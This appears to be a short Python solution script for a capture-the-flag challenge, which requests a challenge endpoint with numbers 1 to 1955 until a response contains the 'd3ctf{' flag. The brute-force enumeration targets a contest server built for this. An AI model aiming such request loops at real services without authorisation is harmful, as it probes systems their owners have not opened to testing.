import requests
url = 'https://shorter.d3ctf-challenge.n3ko.co/hello?='
for i in range(1,1956,1):
  r = requests.get(url + f'{i}')
  if 'd3ctf{' in r.text:
    print(r.text)
    break


# url = 'https://shorter.d3ctf-challenge.n3ko.co/hello?='
# for i in range(1,10,1):
#   r = requests.get(url + f'{i}')
#   print(r.text)